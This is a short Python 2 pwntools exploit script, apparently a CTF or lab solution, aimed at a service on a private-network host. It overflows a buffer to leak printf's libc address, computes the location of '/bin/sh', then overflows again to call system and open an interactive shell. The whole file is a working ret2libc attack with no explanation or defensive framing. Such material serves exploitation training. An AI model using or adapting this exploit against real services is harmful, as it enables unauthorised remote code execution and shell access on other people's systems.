#!/usr/bin/env python2

from pwn import *

context.arch = 'i386'
# remote connection
p = remote("192.168.56.102", 8888)


# useful address
system_plt = p32(0x08048430)
printf_plt = p32(0x08048400)
printf_got = p32(0x804a00c)
pwnme = p32(0x080485f6)

# offset
printf_offset = 0x49940
binsh_offset = 0x15cdc8

print p.recvuntil(">")

# Stage one: leak the dynamic printf address; and continue execution
buf = "A"*44
buf += printf_plt
buf += pwnme
buf += printf_got
p.sendline(buf)
'''
a = p.recvuntil("You")
log.info("The received buffer length: %d" % len(a))
print " ".join(hex(ord(n)) for n in a)
'''
printf_addr = u32(p.recvuntil("You")[1:5])
log.info("printf_addr: 0x%x" % printf_addr)
sh_addr = printf_addr-printf_offset+binsh_offset
log.info("binsh_addr: 0x%x" % sh_addr)

# Stage two: invoke system call '/bin/sh'
buf2 = "A"*44
buf2 += system_plt
buf2 += "CCCC"
buf2 += p32(sh_addr)

p.recvuntil(">")
p.sendline(buf2)
p.interactive()
